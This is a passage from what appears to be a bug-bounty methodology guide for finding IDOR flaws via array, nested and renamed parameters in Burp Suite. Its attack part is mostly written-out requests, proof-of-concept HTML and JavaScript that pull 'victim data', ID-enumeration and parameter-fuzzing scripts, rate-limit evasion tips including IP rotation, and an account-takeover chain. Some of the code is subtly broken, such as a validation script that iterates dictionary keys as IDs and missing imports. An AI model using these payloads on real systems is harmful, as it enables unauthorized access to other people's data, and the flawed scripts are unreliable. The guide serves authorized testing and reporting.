GET /api/documents/view?id[]=§100§&id[]=§101§ HTTP/1.1
```

**Payload Sets:**
```
Set 1: Your IDs [100, 100, 100, 100]
Set 2: Victim IDs [101, 102, 103, 104]
```

**Payload Configuration:**
```
Payload type: Numbers
Number range: 1-1000 (increment by 1)
Number format: Decimal
```

### **Step 3.4: Burp Intruder Attack Types**

**Attack Type 1: Sniper (Single Position)**
```
Position: id[]=§100§
Payload: 101,102,103
→ Tests: id[]=101, id[]=102, id[]=103
```

**Attack Type 2: Battering Ram**
```
Position1: id[]=§100§&id[]=§101§
All positions get same payload
→ Tests: id[]=101&id[]=101
```

**Attack Type 3: Pitchfork (Critical for Bug #27)**
```
Set 1: Your IDs [100,100,100]
Set 2: Victim IDs [101,102,103]
→ Tests: 
  id[]=100&id[]=101
  id[]=100&id[]=102  
  id[]=100&id[]=103
```

**Attack Type 4: Cluster Bomb (Comprehensive)**
```
Set 1: Your IDs [100,100,100]
Set 2: Victim IDs [101,102,103]
→ All combinations:
  id[]=100&id[]=101
  id[]=100&id[]=102
  id[]=100&id[]=103
  id[]=100&id[]=101 (duplicate with next)
```

---

## 📊 **PHASE 4: RESPONSE ANALYSIS**

### **Step 4.1: Response Patterns to Identify**

Create a comparison table:

| Request Format | Expected (Auth) | Actual Response | Vulnerability |
|----------------|-----------------|-----------------|---------------|
| `id=100` | 200 | 200 | Baseline |
| `id=101` | 403 | 403 | Good |
| `id[]=100` | 200 | 200 | OK |
| `id[]=101` | 403 | 403 | OK |
| `id[]=100&id[]=101` | 403 | 200? | **VULN** |
| `id[]=101&id[]=102` | 403 | 200? | **VULN** |

### **Step 4.2: Burp Comparer for Response Analysis**

1. **Select two responses** in HTTP History
2. **Right-click → Send to Comparer**
3. **Compare responses** word-by-word

### **Step 4.3: Grep - Match in Intruder**

Configure Intruder to highlight successes:
```
Options → Grep - Match
Add: "Your Profile", "Welcome", "200 OK"
Add: Response status codes
```

### **Step 4.4: Response Time Analysis**
```
Options → Grep - Extract
Extract response times
Look for anomalies when victim IDs included
```

---

## 🎭 **PHASE 5: ADVANCED ARRAY MANIPULATIONS**

### **Step 5.1: Different Array Syntax Testing**

**PHP Style:**
```
GET /api/data?ids[]=100&ids[]=101
```

**JSON Array in POST:**
```
POST /api/data HTTP/1.1
Content-Type: application/json

{"ids": [100, 101]}
```

**Query String Array:**
```
GET /api/data?ids[0]=100&ids[1]=101
```

**Nested Arrays:**
```
GET /api/data?user[id][]=100&user[id][]=101
```

### **Step 5.2: Parameter Pollution Variations**

**Duplicate Parameters (last wins):**
```
GET /api/data?id=100&id=101
```

**Duplicate with Array Mix:**
```
GET /api/data?id[]=100&id=101
```

**Mixed Types:**
```
GET /api/data?id[]=100&id[]=101&id=102
```

### **Step 5.3: Burp Sequencer for Array Testing**
```
Right-click request → Send to Sequencer
Live capture → Analyze
Check token randomness in array parameters
```

---

## 🔧 **PHASE 6: AUTOMATED SCANNING**

### **Step 6.1: Configure Burp Scanner for IDOR**
```
Target → Site Map → Right-click → Actively scan
Scan Configuration:
✓ Use custom configuration
Insertion points → Check "Add to all parameters"
Attack surface → Check "Parameters"
```

### **Step 6.2: Create Custom Scan Check**
```
Extender → Extensions → Add
Load BApp Store → "IDOR Detector" or custom Python script
```

Example Python extension for array IDOR:
```python
from burp import IBurpExtender, IScannerCheck
import re

class BurpExtender(IBurpExtender, IScannerCheck):
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.setExtensionName("Array IDOR Scanner")
        callbacks.registerScannerCheck(self)
        
    def doPassiveScan(self, baseRequestResponse):
        # Analyze for array parameters
        analyzed = self._helpers.analyzeRequest(baseRequestResponse)
        parameters = analyzed.getParameters()
        
        for param in parameters:
            if param.getName().endswith('[]'):
                # Flag for manual review
                return [self._callbacks.applyMarkers(
                    baseRequestResponse, None, None)]
        return None
```

### **Step 6.3: Intruder Payload Processing**
Create custom payload processor:
```
Intruder → Payloads → Payload Processing
Add → "Invoke Burp Extension"
Select custom processor for array permutations
```

---

## 📝 **PHASE 7: EXPLOITATION & PROOF OF CONCEPT**

### **Step 7.1: Validate the Vulnerability**

**Test Chain:**
1. Login as Account A
2. Capture request with your ID=100
3. Modify to include Victim ID=101
4. Observe if Victim data is returned

**Confirm by accessing exclusive Victim data:**
```
GET /api/private-messages?user_id[]=100&user_id[]=101
```

### **Step 7.2: Create Proof of Concept**

**Simple PoC HTML:**
```html
<html>
  <body>
    <h1>Array IDOR PoC</h1>
    <form action="https://target.com/api/documents/view" method="GET">
      <input type="hidden" name="id[]" value="100">
      <input type="hidden" name="id[]" value="101">
      <input type="submit" value="View Victim Data">
    </form>
  </body>
</html>
```

**JavaScript PoC:**
```javascript
fetch('https://target.com/api/documents/view?id[]=100&id[]=101', {
  credentials: 'include'
})
.then(response => response.json())
.then(data => console.log('Victim data:', data));
```

### **Step 7.3: Burp Macro for Exploitation**
```
Project options → Sessions → Macros → Add
Record macro:
1. Login as attacker
2. Request with array parameters
3. Extract victim data
```

---

## 📊 **PHASE 8: DOCUMENTATION & REPORTING**

### **Step 8.1: Burp Project Saving**
```
Project File → Save copy
Include:
- HTTP History
- Scanner results
- Intruder attacks
- Repeater tabs
```

### **Step 8.2: Generate Report**
```
Target → Site Map → Right-click → Generate Report
Include:
- Issue details
- Request/Response pairs
- Remediation advice
```

### **Step 8.3: Report Template for Bug #27**

```markdown
# IDOR Vulnerability Report - Array Parameter Bypass

## Vulnerability Type
Insecure Direct Object Reference (IDOR) via Array Parameter Manipulation

## Endpoint
`GET /api/documents/view`

## Parameters Affected
- `id[]` (array parameter)

## Description
The application fails to properly validate authorization when multiple IDs are 
provided in array format. While single ID requests are properly checked, 
array requests bypass authorization controls.

## Steps to Reproduce
1. Login as attacker account (ID: 100)
2. Navigate to: /api/documents/view?id[]=100&id[]=101
3. Observe that documents from victim account (ID: 101) are returned
4. Note that `id=101` (single) returns 403, but array returns 200

## Proof of Concept Request
```
GET /api/documents/view?id[]=100&id[]=101 HTTP/1.1
Host: target.com
Cookie: session=ATTACKER_SESSION
```

## Impact
- Unauthorized access to victim documents
- Data breach potential
- Privacy violation

## Remediation
- Validate authorization for ALL objects in array parameters
- Implement proper access control checks per resource
- Consider using indirect reference maps
```

---

## 🛡️ **PHASE 9: ADVANCED BURP TECHNIQUES**

### **Step 9.1: Turbo Intruder for Speed**
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=100,
                           pipeline=False)
    
    # Test array combinations
    for your_id in range(100, 110):
        for victim_id in range(200, 210):
            engine.queue(target.req, [
                your_id,
                victim_id
            ])

def handleResponse(req, interesting):
    if '200 OK' in req.response:
        table.add(req)
```

### **Step 9.2: Custom Scanner Checks**
```
Extender → Extensions → Add (Python)
Create custom check for array IDOR patterns
```

### **Step 9.3: Session Handling Rules**
```
Project options → Sessions → Session handling rules → Add
Rule type: Check session valid
If invalid: Re-login and continue
Apply to: All tools
```

---

## ⚡ **PHASE 10: REAL-WORLD SCENARIOS**

### **Scenario 1: Multi-tenant Applications**
```
GET /api/company/data?company_id[]=123&company_id[]=456
```

### **Scenario 2: Messaging Systems**
```
GET /api/messages?thread_id[]=1001&thread_id[]=1002
```

### **Scenario 3: E-commerce Orders**
```
GET /api/orders?order_id[]=ORD-100&order_id[]=ORD-101
```

### **Scenario 4: Healthcare Records**
```
GET /api/patient/records?patient_id[]=P100&patient_id[]=P200
```

---

## 🔍 **TROUBLESHOOTING GUIDE**

### **Issue: No Response Difference**
- Try different array syntax
- Test POST instead of GET
- Check if application uses JSON

### **Issue: Session Expires**
- Create macro for auto-relogin
- Use session handling rules
- Reduce attack speed

### **Issue: Rate Limiting**
- Add delays in Intruder
- Rotate IPs if possible
- Use Turbo Intruder with throttling

### **Issue: CSRF Tokens**
- Extract tokens with macros
- Use session handling to refresh
- Parse responses for new tokens

---

## 📚 **RESOURCES & REFERENCES**

### **Burp Extensions for IDOR**
1. **Autorize** - Automate authorization tests
2. **AuthMatrix** - Advanced authorization testing
3. **Turbo Intruder** - High-speed attacks
4. **Param Miner** - Discover hidden parameters
5. **Backslash Powered Scanner** - Advanced scanning

### **Useful Regex Patterns**
```
Find array parameters: \[\]
Find numeric IDs: [0-9]{1,}
Find UUIDs: [a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9-]{12}
```

### **Burp Shortcuts**
```
Ctrl+R - Send to Repeater
Ctrl+I - Send to Intruder
Ctrl+Shift+B - Send to Comparer
Ctrl+Shift+X - Send to Sequencer
```

---

## ⚠️ **SAFETY CHECKLIST**

- [ ] Have explicit authorization
- [ ] Test in isolated environment first
- [ ] Don't modify production data
- [ ] Respect rate limits
- [ ] Document all findings
- [ ] Don't access sensitive PII
- [ ] Stop if you find critical data
- [ ] Follow responsible disclosure
- [ ] Clear Burp logs after testing
- [ ] Remove test accounts after completion

---

## 🎯 **SUCCESS INDICATORS**

You've found Bug #27 if:
1. Single ID request is properly authorized
2. Array request with victim ID returns data
3. Response contains victim's private information
4. No additional authentication bypassed
5. Can reproduce with different accounts

---

# 🎯 **Bug #28: Nested Parameters IDOR - Complete Burp Suite Methodology**

## 📋 **Bug Description**
**Nested Parameters IDOR** occurs when applications use complex parameter structures like `user[id]=100` or `{"user":{"id":100}}` and fail to properly validate authorization when these nested parameters are manipulated.

---

## 🔍 **FULL BURP SUITE TESTING METHODOLOGY**

### **PHASE 1: RECONNAISSANCE & MAPPING**

#### **1.1 Spider/Crawl Configuration**
```
1. Open Burp Suite → Target → Site Map
2. Right-click target → Spider → Check "Spider recursively"
3. Configure Spider options:
   - Threads: 5-10
   - Check "Process forms"
   - Check "Parse HTML forms"
   - Check "Request with cookies"
```

#### **1.2 Passive Scanning Setup**
```
Burp → Target → Scope → Include in scope
- Add target domains/IPs

Burp → Scanner → Live Scanning
- Enable "Use suite scope"
- Check "Use advanced scan options"
```

#### **1.3 Parameter Discovery**
**Using Burp Intruder for Parameter Fuzzing:**
```
1. Capture a request
2. Send to Intruder (Ctrl+I)
3. Positions tab → Clear §
4. Add § around parameter values
5. Payloads → Load wordlist with common parameter names:
   
   PARAMETER WORDLIST:
   - id, user_id, account_id, profile_id
   - user, account, profile
   - data[id], data[user_id]
   - user[id], account[id]
   - json.id, json.user.id
   - params.user.id
   - nested[user][id]
   - attributes[user_id]
```

---

### **PHASE 2: IDENTIFYING NESTED PARAMETER PATTERNS**

#### **2.1 Manual Pattern Recognition**

**Check Different Request Formats:**

**URL Encoded Form (application/x-www-form-urlencoded):**
```
POST /api/update-profile HTTP/1.1
Content-Type: application/x-www-form-urlencoded

user[id]=100&user[name]=john&action=update
```

**JSON Format:**
```
POST /api/update-profile HTTP/1.1
Content-Type: application/json

{
    "user": {
        "id": 100,
        "name": "john"
    },
    "action": "update"
}
```

**XML Format:**
```
POST /api/update-profile HTTP/1.1
Content-Type: application/xml

<request>
    <user>
        <id>100</id>
        <name>john</name>
    </user>
    <action>update</action>
</request>
```

#### **2.2 Pattern Discovery Using Burp Proxy History**

```
1. Go to Proxy → HTTP History
2. Filter by target scope
3. Look for patterns in parameters:
   - Click through requests
   - Note parameter naming conventions
   - Look for square brackets [] in parameters
   - Look for nested JSON structures
   - Look for XML nested elements
4. Use Search function (Ctrl+F):
   - Search for "[" and "]"
   - Search for "{" to find JSON
   - Search for "<" to find XML
```

---

### **PHASE 3: SYSTEMATIC TESTING WITH BURP INTRUDER**

#### **3.1 Basic Nested Parameter Manipulation**

**Setup for URL-Encoded Forms:**
```
Request Template:
POST /api/profile/update HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Cookie: session=abc123

user[id]=§100§&user[name]=test&action=view

Payload Configuration:
1. Payload type: Numbers
2. Range: 1-200 (step 1)
3. Number format: Decimal
```

**Attack Types to Try:**

**Sniper Attack (Single parameter):**
```
Positions: user[id]=§100§
Payload: 1,2,3,4,5... (sequential IDs)
```

**Battering Ram Attack (Multiple same values):**
```
Positions: user[id]=§100§&profile[id]=§100§
Payload: 101,102,103...
```

**Pitchfork Attack (Different ID sets):**
```
Positions: user[id]=§100§&profile[id]=§200§
Payload Set 1: 101,102,103...
Payload Set 2: 201,202,203...
```

#### **3.2 Advanced Nested Parameter Testing**

**Test Different Naming Conventions:**
```
PAYLOAD POSITIONS:
user[§id§]=§100§
user[§user_id§]=§100§
user[§account_id§]=§100§
user[§profile_id§]=§100§
```

**Test Deep Nesting:**
```
data[user][profile][id]=§100§
request[params][user][account_id]=§100§
nested[level1][level2][level3][id]=§100§
```

**Test Array Syntax:**
```
user[id][]=§100§
user[][id]=§100§
ids[]=§100§
```

#### **3.3 JSON Nested Parameter Testing**

**Step 1: Capture JSON Request**
```
POST /api/user/update HTTP/1.1
Content-Type: application/json
Cookie: session=abc123

{
    "user": {
        "id": 100,
        "profile": {
            "id": 200
        }
    }
}
```

**Step 2: Configure Intruder for JSON**
```
1. Send to Intruder
2. Switch to JSON tab in request view
3. Highlight "100" and add §
4. Configure payload:
   - Numbers 1-500
   - Process in Burp's JSON parser
```

**JSON Manipulation Templates:**

```json
// Original
{"user":{"id":100}}

// Test variations:
{"user":{"id":101}}
{"user_id":101}
{"data":{"user_id":101}}
{"params":{"user":{"id":101}}}
{"nested":[{"user":{"id":101}}]}
{"users":[{"id":101}]}
{"user":{"identifier":101}}  // Different key name
```

#### **3.4 XML Nested Parameter Testing**

**XML Request Template:**
```
POST /api/user/update HTTP/1.1
Content-Type: application/xml

<request>
    <user>
        <id>§100§</id>
        <profile>
            <id>§200§</id>
        </profile>
    </user>
</request>
```

**XML Payload Variations:**
```xml
<!-- Test different paths -->
<user id="§100§"/>
<user><identifier>§100§</identifier></user>
<account><user_id>§100§</user_id></account>
<data><attributes><user_id>§100§</user_id></attributes></data>
```

---

### **PHASE 4: RESPONSE ANALYSIS TECHNIQUES**

#### **4.1 Setting Up Response Analysis in Intruder**

```
1. Intruder → Options → Grep - Extract
2. Add response extraction rules:
   - Extract response code
   - Extract content length
   - Extract specific text patterns
   - Extract error messages
   
3. Grep - Match patterns:
   Add common indicators:
   - "unauthorized"
   - "forbidden"
   - "access denied"
   - "not found"
   - "success"
   - user's actual data (name, email)
   - "profile updated"
```

#### **4.2 Advanced Analysis with Intruder**

**Response Timing Analysis:**
```
1. Intruder → Options → Request Engine
2. Set Number of threads: 1 (for accurate timing)
3. Set Throttle between requests: 0
4. Add to Intruder → Columns:
   - Enable "Response received"
   - Enable "Response completed"
```

**Content Length Analysis:**
```python
# Use Burp Extender or manual analysis
- Response length 2000: Success (full data)
- Response length 500: Error (access denied)
- Response length 1500: Partial data (possible IDOR)
```

**Status Code Patterns:**
- 200 OK → Potential IDOR if unauthorized data returned
- 403 Forbidden → Properly blocked (continue testing variations)
- 404 Not Found → Invalid ID (enumerate further)
- 302 Redirect → Check redirect location for ID leaks
- 500 Internal Error → Possible injection point

#### **4.3 Using Comparer for Response Analysis**

```
1. Select two responses in Intruder results
2. Right-click → Send to Comparer
3. Use word-by-word comparison
4. Look for:
   - Different user data appearing
   - Subtle differences in error messages
   - Timing differences
   - Header variations
```

---

### **PHASE 5: AUTOMATED SCANNING TECHNIQUES**

#### **5.1 Burp Scanner Active Scan Configuration**

```
1. Right-click request → Do an active scan
2. Scan Configuration → Customize:
   
   Insertion Points:
   - Check "All parameters"
   - Check "Nested parameters"
   - Check "JSON parameters"
   - Check "XML parameters"
   - Check "Multi-part parameters"
   
   Scan Types:
   - Enable "All checks"
   - Add custom IDOR checks
```

#### **5.2 Creating Custom Scan Checks**

**Using Burp Extender API:**
```java
// Pseudocode for custom IDOR check
public List<IScanIssue> doPassiveScan(IHttpRequestResponse requestResponse) {
    // Extract nested parameters
    // Test with different user IDs
    // Compare responses
    // Report if unauthorized access achieved
}
```

#### **5.3 Intruder Payload Processing**

**Create Custom Payload Processor:**
```
1. Intruder → Payloads → Payload Processing
2. Add rule → Add prefix: "user[id]="
3. Add rule → Add suffix: "&"
4. Add rule → Encode: URL-encode key characters
```

**Use Recursive Grep:**
```
1. Intruder → Options → Grep - Extract
2. Extract IDs from responses
3. Use extracted IDs for follow-up attacks
4. Chain multiple Intruder attacks
```

---

### **PHASE 6: SPECIALIZED NESTED PARAMETER TECHNIQUES**

#### **6.1 Parameter Pollution in Nested Structures**

**Test Multiple Same Parameters:**
```
POST /api/update HTTP/1.1

user[id]=100&user[id]=101&user[name]=test
```

**JSON Parameter Pollution:**
```json
{
    "user": {
        "id": 100,
        "id": 101,
        "name": "test"
    }
}
```

#### **6.2 Nested Parameter Injection**

**Try Injecting New Nested Levels:**
```
Original: user[id]=100
Modified: user[profile][admin_id]=100
Modified: user[id]=100&admin[user_id]=100
```

**Test for Privilege Escalation:**
```json
{
    "user": {
        "id": 100,
        "role": "user"
    }
}
// Modify to:
{
    "user": {
        "id": 101,
        "role": "admin"
    }
}
```

#### **6.3 Cross-Parameter Relationships**

**Test Relationships Between Nested Parameters:**
```
user[id]=100&profile[user_id]=100
Modify one but not the other:
user[id]=101&profile[user_id]=100
user[id]=100&profile[user_id]=101
```

---

### **PHASE 7: EXPLOITATION & VALIDATION**

#### **7.1 Manual Verification Process**

**Step-by-Step Validation:**
```
1. Create two test accounts (UserA, UserB)
2. Log in as UserA
3. Capture request with UserA's ID (100)
4. Modify nested parameter to UserB's ID (101)
5. Check if UserB's data is accessible
6. Test write operations (update/delete)
7. Document findings with screenshots
```

#### **7.2 Using Repeater for Precision Testing**

```
1. Send suspicious request to Repeater (Ctrl+R)
2. Test variations manually:
   
   Variation 1: user[id]=101
   Variation 2: data[user_id]=101  
   Variation 3: {"user":{"id":101}}
   Variation 4: <user><id>101</id></user>
   
3. Compare responses side-by-side
4. Test different HTTP methods:
   GET, POST, PUT, DELETE, PATCH
```

#### **7.3 Chain Multiple IDORs**

**Example Chain:**
```
1. First IDOR: Find user IDs via profile.php?user[id]=101
2. Extract email from response
3. Second IDOR: Use email in password reset
4. Third IDOR: Access reset token
5. Account takeover achieved
```

---

### **PHASE 8: ADVANCED BURP CONFIGURATIONS**

#### **8.1 Custom Session Handling**

```
1. Project options → Sessions
2. Add Session Handling Rules:
   
   Rule 1: Check session validity
   - If 401/403, re-authenticate
   
   Rule 2: Macro for login
   - Record login sequence
   - Replay when session expires
   
   Rule 3: CSRF token handling
   - Extract from responses
   - Add to requests
```

#### **8.2 Intruder Resource Pool Configuration**

```
1. Intruder → Resource Pool
2. Create new pool:
   - Maximum concurrent requests: 10
   - Delay between requests: 100ms
   - Retry on network failure: Yes
   - Follow redirects: Always
```

#### **8.3 Extensions for IDOR Testing**

**Recommended Bypass Extensions:**
```
1. Authz - Test authorization by copying requests
2. Autorize - Automatic authorization testing
3. Backslash Powered Scanner - Advanced scanning
4. JSON Web Tokens - JWT manipulation
5. Param Miner - Discover hidden parameters
6. Reflection - Detect reflected parameters
```

---

### **PHASE 9: REAL-WORLD TESTING SCENARIOS**

#### **9.1 E-commerce Platform Testing**

**Nested Parameter Examples:**
```
Cart operations:
POST /api/cart/update
{
    "cart": {
        "items": [
            {
                "product_id": 123,
                "user_id": 100  // <-- Test this
            }
        ]
    }
}

Order history:
GET /api/orders?user[id]=100&filter=past  // <-- Test nested user id
```

#### **9.2 Social Media Application**

**Profile interactions:**
```
View profile:
GET /api/profile?data[user][id]=100  // <-- Test nested parameter

Post comment:
POST /api/post/comment
{
    "post": {
        "id": 500,
        "comment": "test",
        "author": {
            "id": 100  // <-- Can you change to 101?
        }
    }
}
```

#### **9.3 Banking/Financial Application**

**Transaction testing:**
```
View transaction:
GET /api/transactions?filter[account_id]=100  // <-- Test

Transfer money:
POST /api/transfer
{
    "from_account": {
        "id": 100  // <-- Can you change?
    },
    "to_account": {
        "id": 200  // <-- Can you change?
    },
    "amount": 1000
}
```

---

### **PHASE 10: REPORTING & DOCUMENTATION**

#### **10.1 Using Burp's Reporting Features**

```
1. Select findings in Target/Site Map
2. Right-click → Save selected items
3. Generate HTML report:
   - Include request/response pairs
   - Add custom annotations
   - Highlight nested parameters
```

#### **10.2 Documenting Each Finding**

**Finding Template:**
```
VULNERABILITY: IDOR in Nested Parameter [user][id]
ENDPOINT: POST /api/profile/update
PARAMETER: user[id] (nested in JSON)

PROOF:
1. Original request (UserA): {"user":{"id":100}} → returns UserA's data
2. Modified request: {"user":{"id":101}} → returns UserB's data
3. Both users have different sessions

IMPACT: Unauthorized access to any user's profile data

REMEDIATION: Validate user permissions server-side using session tokens, not client-supplied IDs

REPRODUCTION STEPS:
1. Log in as user1
2. Capture POST /api/profile/update
3. Change nested user.id parameter to user2's ID
4. Observe unauthorized access
```

#### **10.3 Screenshot Documentation in Burp**

```
1. Right-click request → Send to Comparer
2. Select both requests → Right-click → Request in browser
3. Take screenshots showing:
   - Before modification (authorized)
   - After modification (unauthorized)
   - Differences in response data
```

---

## 🛠️ **BURP SUITE SHORTCUTS FOR IDOR TESTING**

| Shortcut | Function | Use Case |
|----------|----------|----------|
| `Ctrl+R` | Send to Repeater | Manual nested parameter testing |
| `Ctrl+I` | Send to Intruder | Automated ID enumeration |
| `Ctrl+Shift+B` | Send to Comparer | Compare response differences |
| `Ctrl+F` | Search | Find nested parameter patterns |
| `Ctrl+Shift+F` | Filter settings | Focus on specific requests |
| `Ctrl+Shift+L` | Load/Unload extensions | Add IDOR testing tools |
| `Ctrl+Shift+S` | Save request | Document findings |
| `Ctrl+Shift+P` | Project options | Configure session handling |

---

## 📊 **SUCCESS INDICATORS CHECKLIST**

- [ ] Found nested parameter pattern (JSON/XML/form)
- [ ] Successfully manipulated nested ID
- [ ] Received different user's data
- [ ] Verified with two different accounts
- [ ] Tested both read and write operations
- [ ] Documented request/response pairs
- [ ] Confirmed vulnerability in real scenario
- [ ] Checked for business logic impact
- [ ] Verified no rate limiting/restrictions
- [ ] Tested with authenticated/unauthenticated

---

## ⚠️ **TROUBLESHOOTING COMMON ISSUES**

**Issue 1: Requests failing after parameter change**
```
Solution: Check for:
- CSRF tokens (need to update)
- Session binding (ID tied to session)
- Request signing (HMAC validation)
- Rate limiting (slow down attacks)
```

**Issue 2: All responses return 403**
```
Solution: Try:
- Different parameter locations
- Different HTTP methods
- Different content types
- Authenticated vs unauthenticated
```

**Issue 3: Can't find nested parameters**
```
Solution: Use Param Miner extension:
1. Install Param Miner
2. Right-click request → Extensions → Param Miner
3. Select "Guess params" or "Scan for params"
```

---

## 🎯 **KEY SUCCESS METRICS**

- **Coverage:** Tested all identified nested parameters
- **Depth:** Tested multiple nesting levels
- **Breadth:** Tested different content types
- **Verification:** Manual confirmation of automated findings
- **Impact:** Real user data accessible
- **Chaining:** Potential for account takeover

---

## 📚 **FINAL NOTES**

- Always work within scope and authorization
- Document everything meticulously
- Stop testing if you encounter sensitive data
- Report findings responsibly
- Validate each finding manually
- Consider business impact in your assessment

# Complete Methodology for Bug #29: Parameter Prefix/Suffix IDOR

## **Bug #29 Overview**
**Parameter Prefix/Suffix IDOR** - Testing variations of parameter names by adding prefixes or suffixes to identify hidden or alternative parameters that might be vulnerable to IDOR.

---

## 📋 **PREREQUISITES**

### **Tools Needed in Burp Suite**
- Burp Suite Professional/Community
- Extensions: 
  - Param Miner
  - Logger++
  - Turbo Intruder
  - Copy As Python-Requests
  - Hackvertor

### **Target Identification**
1. **Find base requests** containing IDs:
   ```
   /api/user/100
   /profile?id=100
   /download?file_id=100
   ```

2. **Document parameter patterns**:
   - Original parameter: `id`, `user_id`, `documentId`
   - Original value: Usually numeric, UUID, or string identifier

---

## 🔍 **PHASE 1: RECONNAISSANCE & PARAMETER DISCOVERY**

### **Step 1.1: Spider the Application**
1. **Configure scope**:
   - Target → Scope → Add to scope
   - Enable "Use advanced scope control"

2. **Run active spider**:
   - Right-click target → Spider → Spider this host
   - Note all endpoints with parameters

3. **Analyze sitemap**:
   - Target → Sitemap
   - Filter by parameters using search: `?` or `&`

### **Step 1.2: Passive Parameter Discovery**
1. **Use Param Miner extension**:
   ```
   Extensions → Param Miner → Start passive scan
   Check: "Add to sitemap"
   Enable: "Guess headers"
   ```

2. **Monitor Logger++**:
   - Track all parameters seen
   - Create regex patterns: `\b(id|uid|pid|doc|file)\b`

3. **Create parameter wordlist**:
   ```text
   # Common prefixes
   user_
   account_
   profile_
   member_
   customer_
   client_
   
   # Common suffixes
   _id
   _uid
   _guid
   _number
   _code
   _ref
   _reference
   
   # Combine variations
   user_id
   userId
   UserID
   UID
   PID
   ```

### **Step 1.3: Dictionary Generation**
Create comprehensive parameter wordlist:

```python
# Save as param_wordlist.py
prefixes = ['', 'user', 'account', 'profile', 'member', 'customer', 'client', 
            'person', 'individual', 'owner', 'creator', 'author', 'target',
            'source', 'dest', 'from', 'to', 'recipient', 'sender', 'parent',
            'child', 'related', 'linked', 'associated', 'primary', 'secondary']

suffixes = ['id', 'uid', 'guid', 'uuid', 'number', 'code', 'ref', 'reference',
            'key', 'token', 'hash', 'ident', 'identifier', 'param', 'parameter',
            'value', 'data', 'info', 'record', 'entry', 'item', 'object']

bases = ['id', 'uid', 'pid', 'sid', 'cid', 'uid', 'gid', 'rid', 'tid']

# Generate combinations
with open('param_wordlist.txt', 'w') as f:
    # Prefix + base + suffix
    for prefix in prefixes:
        for base in bases:
            for suffix in suffixes:
                if prefix and suffix:
                    f.write(f"{prefix}_{base}_{suffix}\n")
                    f.write(f"{prefix}{base}{suffix}\n")
                elif prefix:
                    f.write(f"{prefix}_{base}\n")
                    f.write(f"{prefix}{base}\n")
                elif suffix:
                    f.write(f"{base}_{suffix}\n")
                    f.write(f"{base}{suffix}\n")
    
    # Case variations
    common = ['userId', 'UserID', 'user-id', 'user_id', 'user.id',
              'accountId', 'AccountID', 'account-id', 'account_id',
              'profileId', 'ProfileID', 'profile-id', 'profile_id']
    
    for param in common:
        f.write(f"{param}\n")
```

---

## 🎯 **PHASE 2: ACTIVE PARAMETER FUZZING**

### **Step 2.1: Setup Burp Intruder for Parameter Discovery**

1. **Capture base request**:
   ```
   GET /api/profile?id=100 HTTP/1.1
   Host: target.com
   Cookie: session=xyz
   ```

2. **Prepare for parameter fuzzing**:
   - Send to Intruder (Ctrl+I)
   - Attack type: **Pitchfork** or **Sniper**

3. **Configure payload positions**:
   ```
   GET /api/profile?§parameter§=100 HTTP/1.1
   Host: target.com
   Cookie: session=xyz
   ```

4. **Load payloads**:
   - Payload set 1: Load `param_wordlist.txt`
   - Enable: URL-encode these characters

5. **Configure grep**:
   - Add grep match: `"user"`, `"profile"`, `"data"`, `"success"`
   - Add grep extract for response length

6. **Resource pool**:
   - Set threads: 5-10
   - Add delay: 100-500ms

### **Step 2.2: Advanced Parameter Discovery with Turbo Intruder**

```python
# Save as param_discovery.py for Turbo Intruder
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=100,
                           pipeline=False)
    
    # Load parameter wordlist
    with open('param_wordlist.txt', 'r') as f:
        params = [line.strip() for line in f]
    
    # Base request template
    template = f"""GET /api/profile?%s=100 HTTP/1.1
Host: {target.host}
Cookie: session=xyz
Connection: close

"""
    
    # Queue all requests
    for param in params:
        engine.queue(template % param)
        
        # Random delay to avoid rate limiting
        time.sleep(random.uniform(0.1, 0.3))

def handleResponse(req, interesting):
    # Check for interesting responses
    if '200 OK' in req.response:
        print(f"Found parameter: {req.path}")
        
        # Check if response contains user data
        if 'user' in req.response.lower():
            print(f"  → Contains user data!")
```

### **Step 2.3: Response Analysis**

1. **Sort by response length**:
   - Intruder results → Length column
   - Look for unusual lengths (different from baseline)

2. **Check status codes**:
   - 200 OK → Parameter accepted
   - 400/500 → Parameter may be processed
   - 403 → Parameter recognized but blocked

3. **Content analysis**:
   ```text
   Baseline response (no parameter or wrong param):
   {"error":"Missing parameter"}
   
   Interesting response:
   {"user":{"id":100,"name":"victim","email":"victim@test.com"}}
   ```

4. **Time-based analysis**:
   - Enable response time capture
   - Longer times may indicate database queries
   - Compare with baseline

---

## 🔬 **PHASE 3: VALIDATION & EXPLOITATION**

### **Step 3.1: Validate Discovered Parameters**

For each interesting parameter found:

1. **Test with original user ID**:
   ```
   Original: /api/profile?id=100
   New: /api/profile?user_id=100
   ```

2. **Compare responses**:
   ```bash
   # Using Burp Comparer
   Select both requests → Right-click → Send to Comparer
   Check for identical responses
   ```

3. **Test with victim ID**:
   ```
   /api/profile?user_id=101
   ```

4. **Document findings**:
   ```text
   Parameter: user_id
   Original ID (100): Returned user 100 data ✓
   Victim ID (101): Returned user 101 data ✗ (IDOR VULNERABLE)
   ```

### **Step 3.2: Automated Validation Script**

```python
# Using Burp Extender API or Python with requests
import requests
import json

def validate_parameter(base_url, param_name, test_ids):
    """
    Validate if parameter is vulnerable to IDOR
    """
    results = {}
    
    for test_id in test_ids:
        # Test with original user
        params = {param_name: test_id}
        
        # Add original parameters if needed
        if 'original_id' in test_ids:
            params['id'] = test_ids['original_id']
        
        response = requests.get(
            base_url,
            params=params,
            cookies={'session': 'your_session'},
            headers={'User-Agent': 'Mozilla/5.0'}
        )
        
        # Store response
        results[test_id] = {
            'status': response.status_code,
            'length': len(response.text),
            'content': response.text[:200]  # Preview
        }
        
        # Check for user data
        if 'email' in response.text or 'username' in response.text:
            print(f"⚠️ Possible IDOR with {param_name}={test_id}")
    
    return results

# Test IDs
test_ids = {
    'original_id': 100,  # Your ID
    'victim_1': 101,     # Victim ID 1
    'victim_2': 102,     # Victim ID 2
    'invalid': 999999    # Invalid ID for baseline
}

# Run validation
result = validate_parameter(
    'https://target.com/api/profile',
    'user_id',
    test_ids
)

print(json.dumps(result, indent=2))
```

### **Step 3.3: Exploitation Scenarios**

#### **Scenario A: Direct Data Access**
```
GET /api/profile?user_id=101
Response includes:
{
  "id": 101,
